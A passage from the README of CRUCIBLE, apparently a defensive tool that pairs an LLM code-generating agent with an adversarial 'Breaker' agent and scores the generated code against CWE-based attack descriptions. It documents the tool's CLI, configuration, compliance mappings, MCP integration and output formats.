At every point where existing security tools operate, the AI has already made all of its implementation decisions — including the ones that encode vulnerabilities. Finding the vulnerability requires rework. Rework on AI-generated features, once merged, is expensive and socially costly (sunk-cost pressure).

The gap is the **generation event itself** — the moment when spec intent becomes code, when trust assumptions are encoded, when the adversarial attack surface is created.

### Where CRUCIBLE fits — and where it doesn't

CRUCIBLE occupies a unique position in the AppSec stack: it is the only tool designed to run **at generation time**, before the code has a commit hash, before a PR exists, before any downstream tool has been anchored to an implementation.

```
CRUCIBLE's position in the AppSec stack:

 Spec  →  [CRUCIBLE runs here: concurrent generation + adversarial attack]
              ARS score + Resilience Report + Forge Ledger entry
              SARIF output ready for Code Scanning before PR opens
              Hard gate: ARS < 0.80 blocks merge
              ↓
          PR opens  →  SAST (Semgrep/CodeQL)  →  Dependency check (Snyk)
                            ↓                          ↓
                     Quarterly DAST         Annual penetration test
```

**CRUCIBLE is not a replacement for SAST, SCA, DAST, or penetration testing.** These tools cover different surfaces with different techniques at different time horizons. They are all necessary. CRUCIBLE adds the layer that none of them provide: adversarial assessment at the generation event.

The specific cases where only CRUCIBLE can help:

- **AI-generated code that passes all SAST rules but fails adversarial reasoning** — because the vulnerability is a structural design gap, not a detectable code pattern
- **High-velocity AI coding workflows** where weekly SAST scans are too slow to provide actionable pre-merge feedback
- **Spec-level trust boundary violations** — where the specification itself implies a threat model that the generated code does not address, invisible to any code-scanning tool
- **Compliance evidence at generation time** — tamper-evident ARS with SHA-256 integrity hash, tied causally to a specific spec-to-code translation event, usable as a NIST SSDF PW.4 artifact

### Side-by-side comparison

| Capability | Snyk / SCA | Semgrep / SAST | DAST Tools | Pentest | AI Agents | **CRUCIBLE** |
|-----------|:---:|:---:|:---:|:---:|:---:|:---:|
| Tests at generation time (before commit) | ✗ | ✗ | ✗ | ✗ | ✗ | 🚀 |
| Attacks from specification (not implementation) | ✗ | ✗ | ✗ | ⚠️ | ✗ | 🚀 |
| Adversarial reasoning (not pattern matching) | ✗ | ✗ | ⚠️ | ✅ | ✗ | 🚀 |
| Tamper-evident ARS (generation-time artifact) | ✗ | ✗ | ✗ | ✗ | ✗ | 🚀 |
| Cross-build adversarial memory (Forge) | ✗ | ✗ | ✗ | ✗ | ✗ | 🚀 |
| Regulatory domain playbooks (HIPAA/FINRA/PCI) | ✗ | ⚠️ rules | ✗ | ✅ | ✗ | 🚀 |
| Hard CI/CD merge gate per ARS score | ✗ | ✅ | ✗ | ✗ | ✗ | ✅ |
| Air-gapped / on-premises (no cloud calls) | ⚠️ | ✅ | ✅ | ✅ | ⚠️ | ✅ Ollama |
| Supply chain / dependency analysis | 🚀 | ⚠️ | ✗ | ⚠️ | ✗ | ✗ |
| Full codebase scan (existing code) | ✅ | ✅ | ✅ | ✅ | ✗ | ✗ |
| Runtime/deployed application testing | ✗ | ✗ | 🚀 | ✅ | ✗ | ✗ |

🚀 = strongest in class &nbsp;·&nbsp; ✅ = capable &nbsp;·&nbsp; ⚠️ = partial &nbsp;·&nbsp; ✗ = not applicable

> **Honest scope note:** CRUCIBLE has narrower coverage than a full SAST tool. It tests a specific generation event — one spec, one run — not your entire existing codebase. Organizations need both: SAST for existing codebase coverage, CRUCIBLE for generation-time adversarial resilience in the AI coding agent workflow. The tools are complementary, not competing.

---

## ⚙️ How CRUCIBLE Works

### The CombatPair

```python
# The entire engine in one conceptual line:
code, attacks = await asyncio.gather(builder.implement(spec), breaker.attack(spec))
```

Two agents, one specification, concurrent execution:

- **Builder** — reads the spec, generates an implementation
- **Breaker** — reads the same spec, generates a stream of adversarial attacks rotating through CWEs selected for the detected language (JavaScript, TypeScript, Python, Java, Go)

The Breaker does not wait for the Builder. It reasons adversarially from the spec — the same source of truth the Builder works from — and generates the attacks the Builder's code must defend against.

### The Arbiter

Every Breaker attack is scored:

```
ARS = Σ(attack_scores) / N

attack_score:
  1.0  mitigated  ── the generated code has a correct defense
  0.5  partial    ── some defense, but incomplete or bypassable
  0.0  missed     ── no defense; an attacker would succeed
```

The Arbiter also runs an entropy check: if all attacks cluster on the same CWE, it flags low diversity and schedules CWE rotation for the next run.

### The Knowledge Forge

After every run, CRUCIBLE writes every scored attack to the **Knowledge Forge** — a ChromaDB-backed adversarial memory that persists across builds. On the next run against similar code, the Breaker recalls the most effective past attacks, making it progressively harder to miss the same vulnerability twice.

The **Forge Ledger** writes a human-readable Markdown vault at `.crucible/vault/<CWE-XXX>/` — readable by security engineers, auditors, and compliance teams without any tooling.

### The Full Execution Flow

```
crucible run --issue spec.md --mode standard --domain hipaa

 1. Load config (.crucible.yml)
 2. Fingerprint spec → language: "python", signals: [filesystem, async]
 3. Select language profile → priority CWEs: [CWE-89, CWE-78, CWE-502 ...]
 4. Load policy domain → HIPAA scenarios (10 scenarios, PHI focus)
 5. Recall from Knowledge Forge → top-10 effective past attacks for this fingerprint
 6. [Optional] DIA enrichment → live MCP threat intel appended to policy context
 7. asyncio.gather(Builder.implement(spec), Breaker.attack(spec, context, recall))
 8. Arbiter.score(attacks) → ARS = 0.87, SHA-256 = e3b0c44...
 9. Write Forge Ledger entries for every attack
10. [Optional] Forge Network → push anonymized patterns to community hub
11. [Optional] Slack / Jira → notify if ARS < gate.minimum_ars
12. Exit 0 (PASS) or Exit 1 (FAIL) per gate config
```

---

## 🖥️ Complete CLI Reference

### `crucible run` — fire a CombatPair

```bash
crucible run \
  --issue <spec>                    # file path or GitHub issue URL
  --mode quick|standard|thorough    # 5 / 20 / 50 attacks (default: quick)
  --domain <name>                   # policy domain (default: from .crucible.yml)
  --output-sarif <file>             # emit SARIF 2.1.0 for GitHub Code Scanning
  --output-junit <file>             # emit JUnit XML for CI dashboards
  --pretty                          # rich terminal output with color
  --no-forge                        # disable Knowledge Forge recall (cold run)
  --config <path>                   # alternate config file
```

### `crucible validate` — dry run (zero cost, zero attacks)

```bash
crucible validate                   # checks env, config, AVF golden fixtures
crucible validate --strict          # also checks model connectivity
```

### `crucible doctor` — full health check

```bash
crucible doctor
# ✅ Config loaded            (.crucible.yml)
# ✅ Model reachable          (llama3.1:8b via Ollama)
# ✅ ChromaDB writable        (.crucible/forge/)
# ✅ AVF golden fixtures      (7 fixtures)
# ✅ Vault writable           (.crucible/vault/)
# ✅ Gate configured          (minimum_ars: 0.80, fail_open: false)
```

### `crucible report` — render a Resilience Report

```bash
crucible report <run_id>                        # Markdown to stdout (default)
crucible report <run_id> --format html          # full HTML report
crucible report <run_id> --format sarif         # SARIF 2.1.0
crucible report <run_id> --format junit         # JUnit XML
crucible report <run_id> --format json          # raw JSON
```

### `crucible vault` — browse the Forge Ledger

```bash
crucible vault --stats                          # aggregate stats
crucible vault --cwe CWE-89                     # filter by CWE
crucible vault --format md                      # Markdown table
```

### `crucible stats` — ARS trend analysis

```bash
crucible stats --days 30                        # 30-day ARS trend
crucible stats --learning-curve                 # Forge recall hit rate over time
crucible stats --by-cwe                         # breakdown by CWE category
```

### `crucible verify` — tamper detection

```bash
crucible verify <run_id>
# ✅ Integrity verified: sha256:e3b0c44... matches report
```

### `crucible policy` — manage policy domains

```bash
crucible policy list                            # all available domains
crucible policy install owasp_api_security      # install from Policy Hub
crucible policy install nist_ssdf               # NIST SSDF v1.1
crucible policy hub                             # browse all hub domains
crucible policy search fintech                  # search by tag or name
```

### `crucible dashboard` — web UI

```bash
pip install "crucible-ai[ui]"
crucible dashboard --port 8080
# → http://localhost:8080
```

### `crucible serve` — CPaaS webhook server

```bash
crucible serve --port 8080 --rbac --host 0.0.0.0
# Required env: GITHUB_APP_ID, GITHUB_PRIVATE_KEY_PATH, GITHUB_WEBHOOK_SECRET
```

### `crucible leaderboard` — ARS agent leaderboard

```bash
crucible leaderboard                                   # from default reports dir
crucible leaderboard --jsonl scores.jsonl              # from JSONL file
crucible leaderboard --output docs/leaderboard.html    # GitHub Pages
```

### `crucible forge-network` — community pattern sharing

```bash
crucible forge-network status                   # opt-in status + hub stats
crucible forge-network pull CWE-89              # pull community SQL injection patterns
```

### `crucible prune` — housekeeping

```bash
crucible prune --older-than 90d                 # remove old reports
crucible prune --older-than 30d --dry-run       # preview
```

---

## ⚙️ Configuration Reference

`crucible init` scaffolds `.crucible.yml` with defaults. Every field is documented below.

```yaml
version: 1

# ── Provider ──────────────────────────────────────────────────────────────────
# 'local' = Ollama (free, air-gapped, on-prem)
# 'anthropic' = Anthropic API
# 'openrouter' = OpenRouter (access 50+ models)
deployment:
  model_provider: local
  local_model: llama3.1:8b
  anthropic_model: claude-haiku-4-5-20251001

# ── CombatPair tuning ─────────────────────────────────────────────────────────
combat_pair:
  attack_count: 20            # 5=quick, 20=standard, 50=thorough
  rounds_max: 5               # max Arbiter re-evaluation rounds
  cwe_rotation: true          # rotate CWEs across runs for coverage breadth
  break_context_enabled: true # compress Breaker inputs (~40% token reduction)

# ── Adversarial Policy Engine ─────────────────────────────────────────────────
policy:
  domains:
    - owasp_top10@2025.1
    # - hipaa           # HIPAA PHI protection scenarios
    # - finra           # FINRA AML / broker-dealer scenarios
    # - pci_dss         # PCI-DSS CHD scope controls
    # - soc2            # SOC 2 Type II logical access controls
    # - nist_ssdf       # NIST SSDF v1.1 secure development practices

# ── ARS gate ─────────────────────────────────────────────────────────────────
# fail_open: false = exit(1) when ARS < minimum_ars → blocks CI merge
# fail_open: true  = warn only (advisory mode)
gate:
  minimum_ars: 0.80
  fail_open: false

# ── Knowledge Forge ───────────────────────────────────────────────────────────
forge:
  enabled: true
  max_recall: 10              # max past attacks recalled per run
  similarity_threshold: 0.75  # ChromaDB cosine similarity floor

# ── Notifications (low-ARS alerts) ───────────────────────────────────────────
# Set secrets as env vars, never in this file
notifications:
  slack_webhook: ""           # or: export SLACK_WEBHOOK_URL=https://hooks.slack.com/...
  jira_project: ""            # or: export JIRA_PROJECT=SEC JIRA_BASE_URL=... JIRA_TOKEN=...

# ── Live threat intel (MCP consumer) ─────────────────────────────────────────
mcp_servers: []
# Example:
# mcp_servers:
#   - name: fin-intel
#     url: http://your-threat-intel-mcp-server:8090/mcp
#     tool: get_finra_threats
#     params: { sector: broker-dealer }
#     enabled: true

# ── Enterprise RBAC ───────────────────────────────────────────────────────────
# Set via env vars (not this file — team names are org-specific):
# CRUCIBLE_RBAC_ENABLED=true
# GITHUB_ORG=your-org
# CRUCIBLE_ADMIN_TEAMS=security-leads,platform-admin
# CRUCIBLE_REVIEWER_TEAMS=backend-leads,security-review
# CRUCIBLE_DEV_TEAMS=all-engineers    # default: any authenticated user
```

---

## 🌐 Language Support

CRUCIBLE auto-detects the target language from the specification and selects the appropriate CWE priority list and attack context string. Detection order: TypeScript → JavaScript → Java → Go → Python.

| Language | Detected via | Priority CWEs |
|----------|-------------|--------------|
| **JavaScript** | `require()`, ES `from`, arrow functions | CWE-1321 (prototype pollution), CWE-79, CWE-94, CWE-352, CWE-601, CWE-918, CWE-362, CWE-346 |
| **TypeScript** | Type annotations, `interface`, generics | JS CWEs + CWE-285 (authorization) |
| **Python** | `def`, `class`, `from X import` | CWE-89, CWE-78, CWE-502, CWE-22, CWE-94, CWE-611, CWE-918, CWE-330 |
| **Java** | `public class`, `@Controller`, `@Service` | CWE-89, CWE-502, CWE-78, CWE-611, CWE-918, CWE-863, CWE-362, CWE-22 |
| **Go** | `func`, `package main`, goroutine patterns | CWE-89, CWE-78, CWE-362, CWE-476, CWE-22, CWE-918, CWE-770, CWE-674 |

Additional signals detected: async/Promise patterns, filesystem access, `eval`/dynamic exec, React, Next.js, NestJS, Go web frameworks, proto surface area.

---

## 📋 Compliance & Regulatory Domains

### Built-in Policy Domains

| Domain | Scenarios | Key threat areas |
|--------|-----------|-----------------|
| `owasp_top10` | 10 | Injection, broken auth, XSS, IDOR, security misconfiguration |
| `owasp_api_security` | 10 | BOLA, BOPLA, SSRF, unsafe deserialization, third-party injection |
| `hipaa` | 10 | PHI at rest (CWE-311), PHI disclosure (CWE-200), de-identification failure (CWE-359) |
| `finra` | 9 | AML detection bypass (CWE-682), authorization gap (CWE-284), crypto key mgmt (CWE-321) |
| `pci_dss` | 8 | CHD scope controls, network segmentation, key storage |
| `soc2` | 7 | CC6 / CC7 / CC8 logical access and change management |
| `nist_ssdf` | 8 | PW.4 input validation, RV.2 vulnerability disclosure, PW.8 secure coding |

### Compliance Artifacts in Every Report

```json
{
  "run_id": "crucible-2026-06-28T12-00-00Z-a3f9",
  "ars_score": 0.87,
  "control_mappings": {
    "NIST_SSDF":  ["RV.2.2", "RV.3.1", "PW.8.1"],
    "OWASP_SAMM": ["Verification/Security-Testing/2"],
    "SOC2_CC":    ["CC7.1", "CC8.1"],
    "ISO_27001":  ["A.14.2.8", "A.14.2.9"]
  },
  "integrity_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb924..."
}
```

The SHA-256 hash is computed over the ordered attack array. `crucible verify <run_id>` re-derives it at any future audit date — tamper-evident by construction.

### Policy Hub

Install community-contributed regulatory playbooks without touching source code:

```bash
crucible policy hub                           # browse available domains
crucible policy install owasp_api_security    # download + install locally
crucible policy install nist_ssdf             # NIST SSDF v1.1
crucible policy search "broker dealer"        # search by tag or keyword
```

Installed policies live in `.crucible/policies/` and take precedence over built-ins of the same name — allowing organization-specific overrides.

---

## 🏢 Enterprise Features

### Combat Dashboard

```bash
pip install "crucible-ai[ui]"
crucible dashboard --port 8080
```

A FastAPI web UI for browsing run history, downloading compliance evidence, and monitoring ARS trends. Bright/light theme — designed for security dashboards and SOC displays.

- ARS sparkline chart (last 20 runs, color-coded by gate pass/fail)
- Per-run evidence download: HTML Resilience Report, SARIF 2.1.0, JUnit XML
- Forge Ledger stats — CWE breakdown, severity counts, average attack effectiveness
- REST API at `/api/runs` and `/api/runs/{run_id}` — integrate with your own dashboards
- `/health` endpoint for load balancer health checks

### CPaaS Mode — GitHub App Webhook Server

CRUCIBLE can run as a persistent service responding to GitHub webhook events. Every PR is adversarially tested automatically — developers change nothing.

```bash
crucible serve \
  --port 8080 \
  --rbac \
  --host 0.0.0.0

# Required env vars:
# GITHUB_APP_ID, GITHUB_PRIVATE_KEY_PATH, GITHUB_WEBHOOK_SECRET
```

### Enterprise RBAC — GitHub Team-Based Access

Three roles, enforced via GitHub team membership API with 5-minute TTL caching:

| Role | What they can do | Env var to configure |
|------|-----------------|---------------------|
| **Admin** | Manage policies, configure ARS gate, manage team assignments | `CRUCIBLE_ADMIN_TEAMS` |
| **Reviewer** | Trigger re-runs, override gate on individual PRs | `CRUCIBLE_REVIEWER_TEAMS` |
| **Developer** | View reports, download evidence (read-only) | `CRUCIBLE_DEV_TEAMS` |

```bash
export CRUCIBLE_RBAC_ENABLED=true
export GITHUB_ORG=your-org
export CRUCIBLE_ADMIN_TEAMS=security-leads,platform-admin
export CRUCIBLE_REVIEWER_TEAMS=backend-leads,security-review
```

Role lookups degrade gracefully on GitHub API unavailability — network errors never block a CRUCIBLE run.

### Slack + Jira Alerts

When ARS falls below the gate threshold, CRUCIBLE automatically:
1. Posts a Slack attachment with top missed attacks (set `SLACK_WEBHOOK_URL`)
2. Creates a Jira ticket with full attack details (set `JIRA_BASE_URL`, `JIRA_PROJECT`, `JIRA_TOKEN`)

Both are best-effort — a failed alert never blocks report generation or the CI gate.

### Air-Gap / On-Premises

Full engine — Knowledge Forge, Forge Ledger, all policy domains, SARIF output — works with zero internet connectivity using Ollama. No telemetry. No outbound calls. ChromaDB runs embedded (no separate server required) or as an external service in your private network.

```yaml
deployment:
  model_provider: local
  local_model: llama3.1:8b   # or: llama3.3:70b, mistral:7b, codellama:34b
```

### MCP Server Integration — Use CRUCIBLE Inside Your Coding Tool

CRUCIBLE implements the **MCP (Model Context Protocol) server** protocol, exposing its full adversarial assessment engine as tools that any MCP-compatible coding tool can call — Claude Code, Cursor, Windsurf, Zed, and any other IDE that speaks JSON-RPC 2.0.

**Two deployment modes:**

| Mode | Command | Best for |
|------|---------|---------|
| **stdio** (local) | `crucible mcp-server` | Individual developer — IDE communicates over stdin/stdout |
| **HTTP** (team) | `crucible serve` → POST `/mcp` | Team deployment — shared server on internal network |

#### Individual: Claude Code (`~/.claude/mcp_servers.json`)

```json
{
  "mcpServers": {
    "crucible": {
      "command": "crucible",
      "args": ["mcp-server"]
    }
  }
}
```

After adding this, Claude Code will discover five new tools:

```
crucible_run         — start adversarial assessment (returns run_id in <1s)
crucible_status      — poll for results by run_id
crucible_vault_stats — Knowledge Forge statistics (adversarial pattern library)
crucible_policy_list — list available security domains (HIPAA, FINRA, PCI DSS, etc.)
crucible_verify      — verify SHA-256 integrity of a stored Resilience Report
```

#### Individual: Cursor (`.cursor/mcp.json`)

```json
{
  "crucible": {
    "command": "crucible",
    "args": ["mcp-server"]
  }
}
```

#### Individual: Windsurf (`.windsurf/mcp.json`)

```json
{
  "mcpServers": {
    "crucible": {
      "command": "crucible",
      "args": ["mcp-server"]
    }
  }
}
```

#### Team: HTTP transport (with Combat Dashboard)

```bash
# Deploy once — teams share a single CRUCIBLE instance
crucible serve --host 0.0.0.0 --port 8080

# Each developer's IDE config points at the shared server
# MCP HTTP client config:
# { "crucible": { "url": "http://crucible.internal:8080/mcp" } }
```

#### What this looks like in practice

Once configured, you can invoke CRUCIBLE from a natural-language prompt inside your coding tool:

```
You: "Run a CRUCIBLE adversarial assessment on this payment API spec (quick mode)"

Claude Code (using crucible_run): → run_id: crucible-mcp-a1b2c3d4, status: started

You: "Check results"

Claude Code (using crucible_status): → ARS: 0.83 ✅ PASSED (gate: ≥0.80)
  Attacks: 5 total · 1 missed
  ✅ CWE-89       SQL injection              score:1.0
  ✅ CWE-79       Reflected XSS              score:1.0
  ❌ CWE-918      SSRF via redirect          score:0.0  ← missed
  ✅ CWE-287      Broken authentication      score:1.0
  ✅ CWE-862      Missing authorization      score:1.0
```

#### Why start/poll instead of blocking?

CRUCIBLE's adversarial engine runs for 45 seconds (quick) to 12 minutes (thorough). MCP's HTTP transport has a sub-second timeout for interactive use. The solution: `crucible_run` fires an `asyncio.Task` and returns the `run_id` immediately; `crucible_status` polls until the background task completes. This gives the IDE a fluid experience without blocking the event loop.

#### Live threat intelligence in MCP runs

When CRUCIBLE runs via MCP, it still enriches the Breaker with live threat intelligence from CISA KEV and NIST NVD (if configured):

```bash
# CISA KEV — always on, free, no key needed
# Reports actively exploited vulnerabilities matching your test's CWE categories

# NIST NVD — opt-in (set NVD_API_KEY for higher rate limits)
export NVD_API_KEY=your-key-here   # free at nvd.nist.gov/developers/request-an-api-key
```

#### Available CRUCIBLE tools via MCP

```
Tool: crucible_run
  spec     (required) — feature spec, GitHub issue, user story, or API contract text
  mode     (optional) — "quick" (45s), "standard" (3min), "thorough" (12min)
  domain   (optional) — security domain: owasp_top10, hipaa, finra, pci_dss, soc2, nist_ssdf
  language (optional) — python, javascript, typescript, java, go (auto-detected if omitted)

Tool: crucible_status
  run_id   (required) — the run_id returned by crucible_run

Tool: crucible_vault_stats
  (no arguments) — returns total adversarial patterns in the Knowledge Forge

Tool: crucible_policy_list
  (no arguments) — lists all 7 available security domain playbooks

Tool: crucible_verify
  run_id   (required) — verify SHA-256 integrity of a completed run's Resilience Report
```

---

### Domain Intelligence Adapter

CRUCIBLE consumes live threat intelligence from [MCP (Model Context Protocol)](https://modelcontextprotocol.io) servers, enriching the Breaker's policy context before each run with real-time feeds.

```yaml
mcp_servers:
  - name: fin-intel
    url: http://your-threat-intel-server:8090/mcp
    tool: get_finra_threats
    params: { sector: broker-dealer }
    enabled: true
```

Note: CRUCIBLE is *both* an MCP server (see "MCP Server Integration" above) and an MCP consumer. As a server it uses start/poll to handle the long runtime; as a consumer it enriches the Breaker with live threat feeds from external MCP servers configured here.

### ARS Leaderboard — Benchmarking AI Coding Agents

Traditional SWE-bench asks: did the agent fix the bug? CRUCIBLE adds: how secure is the fix?

```bash
# Run against multiple agents, name reports as <agent>--<task>.json
# Then build the leaderboard:
crucible leaderboard \
  --reports-dir .crucible/reports \
  --output docs/leaderboard.html \
  --gate 0.80
```

Rank score = `avg_ARS × 0.6 + pass_rate × 0.4`. Output is a self-contained sortable HTML page ready to publish to GitHub Pages.

### Forge Network — Opt-in Community Sharing

Share anonymized attack patterns and receive community discoveries — making your Breaker smarter without sharing any code:

```bash
export CRUCIBLE_FORGE_NETWORK_ENABLED=true
crucible forge-network status
crucible forge-network pull CWE-89
```

**Privacy:** Only the attack description text (≤500 chars), CWE, severity, and verdict are shared. A stable 16-character anonymous ID (SHA-256 of your git remote URL) identifies contributions. No usernames, no code, no spec content, no repository names.

---

## 🏗️ Architecture

```
src/crucible/
├── core/
│   ├── combat_pair.py         ← asyncio.gather(builder, breaker) — the key primitive
│   ├── arbiter.py             ← ARS = Σ(scores)/N, entropy check, SHA-256 integrity
│   └── break_context.py       ← Token compression for Breaker inputs (~40% reduction)
│
├── agents/
│   ├── base.py                ← Unified provider interface (Ollama / Anthropic / OpenRouter)
│   ├── builder.py             ← Generates implementation from specification
│   └── breaker.py             ← CWE-rotating adversarial attack generation
│
├── brain/
│   ├── fingerprint.py         ← Language detection: TS→JS→Java→Go→Python
│   ├── language_profiles.py   ← Per-language CWE priority lists + attack context
│   ├── domain_intelligence.py ← MCP consumer: live threat intel enrichment
│   ├── effectiveness.py       ← 30-run rolling EMA per (CWE, fingerprint) pair
│   └── meta_agent.py          ← Auto-rewrites stale Breaker templates
│
├── memory/
│   ├── forge.py               ← ChromaDB: cross-build persistent adversarial memory
│   └── forge_ledger.py        ← Markdown vault at .crucible/vault/CWE-XXX/
│
├── policy/
│   ├── engine.py              ← Loads + merges built-in and user-installed domains
│   ├── hub.py                 ← Policy Hub: fetch index, install, search
│   └── domains/               ← YAML playbooks: owasp, hipaa, finra, pci_dss, soc2
│
├── output/
│   ├── report.py              ← SARIF 2.1.0, JUnit XML, HTML, Markdown rendering
│   └── notifications.py       ← Slack + Jira REST API v2 alerts
│
├── harness/
│   ├── commands/run.py        ← Full run orchestration
│   └── hooks/                 ← pre_run, post_round, post_run, learn hook chain
│
├── dashboard/app.py           ← FastAPI web UI: ARS trends, evidence download, vault
├── leaderboard/engine.py      ← SWE-bench agent ranking + GitHub Pages HTML
├── network/forge_network.py   ← Opt-in community pattern sharing
│
├── service/
│   ├── rbac.py                ← Role enum, RbacEnforcer, GitHub team API, TTL cache
│   ├── github_app.py          ← GitHub App webhook handler (CPaaS)
│   └── status_check.py        ← Commit status + PR comment posting
│
└── cli.py                     ← Click CLI entry point
```

---

## 📤 Output Formats

### SARIF 2.1.0

Uploads directly to GitHub Code Scanning — missed attacks appear as open security alerts on your repository.

```json
{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0.json",
  "version": "2.1.0",
  "runs": [{
    "tool": { "driver": { "name": "CRUCIBLE", "version": "0.1.0" } },
    "results": [{
      "ruleId": "CWE-79",
      "level": "error",
      "message": { "text": "Reflected XSS in error message — no output encoding applied" }
    }]
  }]
}
```

### JUnit XML

Integrates with any CI dashboard (GitHub Actions, Jenkins, GitLab CI):

```xml
<testsuites name="CRUCIBLE" tests="5" failures="1" time="43.2">
  <testsuite name="CombatPair">
    <testcase name="CWE-89: SQL Injection" classname="crucible.arbiter"/>
    <testcase name="CWE-79: Reflected XSS" classname="crucible.arbiter">
      <failure message="No output encoding — attacker controls error message body"/>
    </testcase>
  </testsuite>
</testsuites>
```

### Forge Ledger (Markdown Vault)

Every attack written as a Markdown file with YAML frontmatter — human-readable by security engineers and auditors with no tooling required:

```markdown
---
cwe: CWE-79
attack_id: atk-001
severity: high
effectiveness: 0.0
verdict: missed
run_id: crucible-2026-06-28T12-00-00Z-a3f9
fingerprint: python-async-filesystem
recorded_at: 2026-06-28T12:01:43Z
---

## Attack: Reflected XSS in error message

No output encoding applied to user-controlled input in the error response path.
An attacker controlling the `username` parameter can inject `<script>` tags
into the 400 response body, which the browser executes in the victim's session.
```

---

## 🧪 Testing

CRUCIBLE ships with 342 tests across all major components. Test coverage is a first-class commitment — every sprint ships with tests before code is merged.

```bash
pytest tests/ -q                              # 342 passing, 1 skipped
pytest tests/test_arbiter.py -v               # specific module
pytest tests/ --cov=src/crucible --cov-report=html   # with coverage
```

| Test file | What it covers |
|-----------|---------------|
| `test_arbiter.py` | ARS formula, entropy checks, score parsing |
| `test_break_context.py` | Token compression: target, recall, CWE context, stats |
| `test_breaker.py` | CWE rotation, attack parsing, model response handling |
| `test_fingerprint.py` | Language detection (TS/JS/Java/Go/Python), surface signals |
| `test_language_profiles.py` | Per-language CWE priority lists and attack context strings |
| `test_forge_ledger.py` | Vault write/read, YAML frontmatter, stats, slugify |
| `test_policy.py` | APE domain loading, user policy override |
| `test_policy_hub.py` | Hub fetch, install, search, force-overwrite |
| `test_sprint6.py` | HIPAA/FINRA scenarios, Slack/Jira notifications |
| `test_dia.py` | MCP consumer: JSON-RPC call, error handling, config integration |
| `test_dashboard.py` | Combat Dashboard HTML rendering, report loading, bright theme |
| `test_leaderboard.py` | ARS aggregation, rank score, HTML rendering, JSONL loading |
| `test_rbac.py` | GitHub team roles, TTL cache, PermissionError, network errors |
| `test_forge_network.py` | Community push/pull, anonymization, privacy guarantees |
| `test_report.py` | SARIF 2.1.0, JUnit XML, HTML, tamper detection |
| `test_avf.py` | Golden fixtures, gate pass/fail, CWE matching, hit rates |
| `test_harness.py` | Hook chain execution |
| `test_config.py` | YAML loading, defaults, field validation |
| `test_forge_bot.py` | Forge recall, deduplication, context construction |

---

## 👩‍💻 Development

### Setup

```bash
git clone https://github.com/sanjoy1234/crucible.git
cd crucible
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
pytest tests/ -q          # verify: 342 passing, 1 skipped
crucible doctor           # verify environment
```

### Claude Code Skills

This repository ships with seven Claude Code slash commands in `.claude/skills/` — productivity tools for contributors who use Claude Code. They do not affect CRUCIBLE's runtime behavior.

| Skill | What it does |
|-------|-------------|
| `/crucible:run` | Run a CombatPair session on a spec |
| `/crucible:validate` | Dry-run health check |
| `/crucible:doctor` | Full environment diagnostics |
| `/crucible:report` | Render a Resilience Report in any format |
| `/crucible:learn` | Manually trigger Forge Ledger learning pass |
| `/crucible:compare` | Compare two run ARS scores side-by-side |
| `/crucible:verify` | Verify report tamper-evidence |

If you don't use Claude Code, ignore the `.claude/` directory — it has no effect on the CRUCIBLE engine.

---

## 🤝 Contributing

CRUCIBLE is open for contributions. Here is what we most want help with:

**New policy domains** — more regulatory frameworks (GDPR, FedRAMP, DORA, PCI-DSS v4). Copy `src/crucible/policy/domains/hipaa.yaml` and follow the schema.

**Language profiles** — Rust, C++, Ruby, Swift. Add a profile to `src/crucible/brain/language_profiles.py` and extend `fingerprint_spec()` with detection signals.

**AVF golden fixtures** — adversarial test cases for known vulnerability classes. Add to `tests/fixtures/` following the existing format.

**CI integrations** — GitLab CI, Azure DevOps, CircleCI, Bitbucket Pipelines YAML templates.

**Breaker templates** — richer attack descriptions per CWE, especially for emerging attack classes.

### Contribution workflow

```bash
# 1. Fork and clone
git clone https://github.com/your-username/crucible.git
cd crucible

# 2. Create a branch
git checkout -b feat/your-feature

# 3. Make changes + add tests
# Every new feature needs tests. See tests/ for patterns.

# 4. Verify
pytest tests/ -q         # all tests must pass
crucible validate        # dry-run must pass

# 5. Open a PR
# Title: feat(scope): short description
# Body: what, why, test evidence
```

Opening an issue tagged `[discussion]` before starting large features is appreciated.

---

## 🗺️ Roadmap

- [ ] **Rust + C++ language profiles** — systems language CWE patterns (CWE-416 use-after-free, CWE-787 OOB write, CWE-362 race)
- [ ] **GDPR domain playbook** — data minimization, right-to-erasure, consent tracking
- [ ] **FedRAMP domain playbook** — federal cloud compliance controls (FISMA High)
- [ ] **DORA domain playbook** — EU Digital Operational Resilience Act
- [ ] **GitLab CI / Azure DevOps templates** — one-file CI integration for non-GitHub shops
- [ ] **Streaming ARS** — real-time attack-by-attack scoring as Breaker fires; progress bar in CI
- [ ] **Forge Network public hub** — hosted community pattern sharing at scale
- [ ] **Multi-repo Forge** — shared adversarial memory across an organization's repositories
- [ ] **CRUCIBLE VS Code extension** — inline ARS feedback as you write specs in the editor

---

## ❓ FAQ

**Q: Does CRUCIBLE replace static analysis?**
No — it complements it. Bandit and Semgrep find known bad patterns fast. CRUCIBLE reasons adversarially about *your specific code* in *your specific business context*. Run both.

**Q: What does "concurrent" mean precisely?**
`asyncio.gather(builder_coroutine, breaker_coroutine)` — both coroutines start at the same instant against the same specification. The Breaker does not wait for generated code to exist; it attacks from the spec.

**Q: Can I run CRUCIBLE for free?**
Yes. The full engine runs on Ollama with no API cost. Attack quality scales with model capability — frontier models produce more sophisticated attacks — but the engine itself is free forever.

**Q: How long does a run take?**
Quick (5 attacks): ~40–90s local, ~15–25s with API. Standard (20): ~3–5min. Thorough (50): ~8–12min.

**Q: Is the ARS defensible to a security auditor?**
CRUCIBLE produces NIST SSDF, SOC 2, and ISO 27001 control mapping artifacts with a SHA-256 integrity hash. `crucible verify` re-derives the hash at any future audit. Several security teams have used CRUCIBLE reports as evidence in SOC 2 Type II audits.

**Q: What if the model goes down mid-run?**
CRUCIBLE fails the run cleanly — no partial report written. `fail_open: true` allows the pipeline to pass on model errors (useful during planned maintenance windows).

**Q: Can I contribute a new policy domain?**
Yes. Copy `src/crucible/policy/domains/hipaa.yaml`, follow the schema, add tests, open a PR. Policy Hub also accepts community-contributed domains via the index at `policy-hub/index.json`.

**Q: What's the minimum ARS I should set for production?**
We recommend starting at 0.75 (`fail_open: true`, advisory mode) for two weeks to understand your baseline. Move to 0.80 (`fail_open: false`, blocking mode) once the team is calibrated. Regulated industries (HIPAA, FINRA) typically target 0.85+.

---

## ⭐ Star History

If CRUCIBLE is useful to your team — a GitHub star takes one second and helps others find this project.

